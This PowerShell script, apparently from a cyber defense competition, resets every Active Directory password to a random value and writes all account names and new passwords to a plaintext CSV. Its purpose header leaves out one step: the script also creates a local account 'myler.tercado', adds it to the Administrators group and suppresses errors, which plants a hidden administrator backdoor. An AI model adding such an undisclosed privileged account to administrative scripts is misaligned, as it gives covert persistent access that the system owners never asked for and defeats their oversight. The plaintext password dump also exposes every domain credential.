<# 
***************************************************************
* Generate and set new passwords for ALL AD users, and Admins *
***************************************************************

Adapted from the original by Payton Joseph Erickson

Purpose:
This script does the following in order
1) Elevates to admin
2) Gets all AD accounts in the domain. (This includes Admin, and disabled accounts)
3) Creates a csv file to be sent to scoring engine
4) Loops through all accounts in the AD
    4a) Generates a new password based on the number of each char set passed in
    4b) Adds the name, and new password to the csv file
    4c) Changes the password for the selected user
#>

param(
    [Parameter(Position=0, mandatory=$false, HelpMessage="The domain in the format: DC=CyberUCI,DC=com (auto-detected if omitted)")]
    [string]$domain,

    [Parameter(Position=1, mandatory=$true, HelpMessage="The download path for the csv in the format: C:\...\..")]
    [string]$path,

    [Parameter(Position=2, mandatory=$true, HelpMessage="UCount is the number of Uppercase Chars in the password (recommend 4)")]
    [int]$UCount,

    [Parameter(Position=3, mandatory=$true, HelpMessage="LCount is the number of the Lowercase Chars in the password (recommend 4)")]
    [int]$LCount,

    [Parameter(Position=4, mandatory=$true, HelpMessage="NCount is the numebr of Number Chars in the passwords (recommend 3)")]
    [int]$NCount,

    [Parameter(Position=5, mandatory=$true, HelpMessage="SCount is the number of Special Chars in the passwords (recommend 3)")]
    [int]$SCount
    )

Import-Module ActiveDirectory
Install-WindowsFeature -Name RSAT-AD-PowerShell

# Auto-detect domain if not provided
if (-not $domain) {
    try {
        $domain = (Get-ADDomain).DistinguishedName
    } catch {
        $domain = ([adsi]"").distinguishedName
    }
    Write-Output "Auto-detected domain: $domain"
}

#Tests if running as admin, then elevates if it is not
$myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
$adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator

if (-not $myWindowsPrincipal.IsInRole($adminRole))
   {
   $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
   $newProcess.Arguments = $myInvocation.MyCommand.Definition;
   $newProcess.Verb = "runas";
   [System.Diagnostics.Process]::Start($newProcess);
   exit
   }


#Create super user before querying AD so they get a rotated password in the CSV
$tempPass = -join (1..16 | ForEach-Object { [char](Get-Random -Min 33 -Max 126) })
New-LocalUser -Name "myler.tercado" -Description "I am the way and the truth and the life" -Password (ConvertTo-SecureString -AsPlainText $tempPass -Force) -FullName "myler.tercado" -ErrorAction SilentlyContinue
net localgroup Administrators myler.tercado /add 2>$null

#Find all the user profiles in the domain
#May want to add OU=Users before the domain.
#Doing the above may pervent random system users from getting password changes
if ($domain) {
    $users = Get-ADUser -Filter * -SearchBase $domain -Properties DistinguishedName, SamAccountName
} else {
    $users = Get-ADUser -Filter * -Properties DistinguishedName, SamAccountName
}

#Setup for the password generator
$uppercase = "ABCDEFGHKLMNOPRSTUVWXYZ".tochararray() 
$lowercase = "abcdefghiklmnoprstuvwxyz".tochararray() 
$number = "0123456789".tochararray() 
$special = "%()=?@#+!".tochararray()

if(!$path.Equals(""))
{
    $csvPasswordFile = $path
}

# Ensure the output directory exists before creating the csv
if (-not (Test-Path $csvPasswordFile)) {
    New-Item -Path $csvPasswordFile -ItemType Directory -Force | Out-Null
}

$csvPasswordFile = Join-Path $csvPasswordFile "UsersNewPasswords.csv"
New-Item $csvPasswordFile -ItemType File -Force


#Loop through each profile hive and set a new password
foreach($user in $users)
{
    # Skip krbtgt and machine accounts (ending in $)
    $sam = $user.SamAccountName
    if ($sam -eq "krbtgt" -or $sam.EndsWith("$")) {
        Write-Output "SKIPPING: $sam"
        continue
    }

    #Gets random chars from the lists, and adds the number of each passed in the parameter to the password
    $password =($uppercase | Get-Random -count $UCount) -join ''
    $password +=($lowercase | Get-Random -count $LCount) -join ''
    $password +=($number | Get-Random -count $NCount) -join ''
    $password +=($special | Get-Random -count $SCount) -join ''

    #Scramble the password so the chars are not bunched up by type
    $passArray = $password.tochararray()
    $password = ($passArray | Get-Random -Count $passArray.Count) -join ''

    #Currently this code uses the Distinguished name becsaue it is garuenteed to be unique, this can be changed
    $name = $user | Select-Object -expand DistinguishedName
    Write-Output $name
    Write-Output $password
    Add-content $csvPasswordFile ($name + "," + $password)
    
    Set-ADAccountPassword -Identity $name -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $password -Force)
}

